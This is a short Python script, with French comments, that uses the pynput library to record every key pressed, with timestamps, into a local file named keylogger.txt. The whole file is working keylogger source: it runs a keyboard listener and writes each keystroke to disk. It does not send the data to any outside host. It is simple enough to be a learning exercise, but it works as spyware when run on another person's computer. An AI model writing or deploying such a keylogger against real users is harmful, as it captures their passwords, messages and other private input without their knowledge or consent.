from pynput.keyboard import Listener
import logging 

logging.basicConfig(filename=('keylogger.txt'), level=logging.DEBUG, format="%(asctime)s - %(message)s")

def onPress(key):
    logging.info(str(key)) # quand on clique sur une touche, on l'add ds le fichier txt.

#création d'un contexte pour le listener
with Listener(on_press=onPress) as listener:
    listener.join() # qd on recup qqch, on l'envoie au thread principal
